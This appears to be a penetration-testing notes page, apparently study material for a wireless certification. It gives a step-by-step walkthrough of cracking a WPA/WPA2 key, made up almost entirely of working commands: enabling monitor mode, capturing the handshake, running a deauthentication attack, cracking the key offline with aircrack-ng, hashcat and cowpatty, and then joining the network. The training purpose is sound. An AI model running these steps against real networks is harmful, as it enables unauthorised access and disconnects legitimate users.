---
title: WPA/WPA2
source_url: https://notes.incendium.rocks/pentesting-notes/wireless-networks/wpa-wpa2
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: wireless
---
Steps to crack the WPA/WPA2 key. We will need a WPA handshake.

### 1. Monitor mode

First of all check and kill with airmon-ng:

```bash
sudo airmon-ng check
sudo airmon-ng check kill
```

Next, we enable monitor mode:

```bash
sudo airmon-ng start wlan0
sudo airmon-ng start wlan0 <channel_id>

# scan 5ghz networks
sudo airodump-ng -b a wlan0
```

### 2. Finding target

We will now find the bssid (MAC) and essid (SSID) of our target:

```bash
sudo airodump-ng wlan0
```

Example output:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FaUma9AJFnMMKYGpnFonX%2Fimage.png?alt=media&amp;token=680a6314-d10e-4384-afb7-49888819f75f" alt=""><figcaption></figcaption></figure>

We found our target **F0:A7:31:46:69:71** and see its using WPA2 PSK auth. We can also see its on channel 1.

### 3. Dumping & getting handshake

```bash
sudo airodump-ng -c 1 -w wpa2 --bssid F0:A7:31:46:69:71 wlan0
```

-c | channel to 1

-w for write output as wpa2

\--bssid for target MAC

wlan 0 our monitor interface

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FujqZFuutgasvN0A3XjBR%2Fimage.png?alt=media&amp;token=f7615422-6cf0-4fc5-bf97-bd01be082520" alt=""><figcaption></figcaption></figure>

We will now have to wait for a client to connect to the network or inject using a deauthorization attack. We can see one station (client) is connected **8C:EC:7B:0F:63:24**.

### 4. Re-authentication attack&#x20;

We use ‘aireplay-ng’ which is an injection attack. This forces a re-authentication packet into the wire.

```bash
┌──(kali㉿kali)-[~/offsec/oswp]
└─$ sudo aireplay-ng -0 1 -a F0:A7:31:46:69:71 -c 8C:EC:7B:0F:63:24 wlan0
13:38:20  Waiting for beacon frame (BSSID: F0:A7:31:46:69:71) on channel 1
13:38:21  Sending 64 directed DeAuth (code 7). STMAC: [8C:EC:7B:0F:63:24] [ 0| 0 ACKs]
```

After that we can see "WPA handshake: X" status:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FOmzJ1LPZ5RTLwr0ygUVu%2Fimage.png?alt=media&amp;token=5825594d-a996-4e4a-b41a-0ca5c8bd8993" alt=""><figcaption></figcaption></figure>

We now have captured a handshake in the .cap file. We can now use aircrack to crack the PSK.

### 5. Cracking

Now we will run ‘aircrack-ng’ against the dump file we gathered earlier.

```bash
aircrack-ng -w list.txt  -e OSWP -b F0:A7:31:46:69:71 wpa2-01.cap
```

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FyOJjMOphmLS5KTH4iJNm%2Fimage.png?alt=media&amp;token=9ab71938-5a9a-4ea1-abc2-22b862837aea" alt=""><figcaption></figcaption></figure>

#### With hashcat

Convert cap to hashcat hash mode 22000

```sh
hcxpcapngtool -o hash.hc22000 -E wordlist wpa2-01.cap
```

Crack it

```sh
hashcat -m 22000 hash.hc22000 list.txt
```

**With cowpatty**

First generate list of hashes:

```bash
genpmk -f list.txt -d oswphashes -s OSWP
```

Then crack it:

```bash
cowpatty -r wpa2-01.cap -d oswphashes -s OSWP
```

## Connecting to WPA2 network

{% code title="psk.conf" lineNumbers="true" %}

```json
network={
    ssid="wifi-mobile"
    psk="$PASSWORD"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

{% endcode %}

Then connect to wlan3 interface

```
wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf
```

And get DHCP IP:

```
dhclient wlan3 -v
```
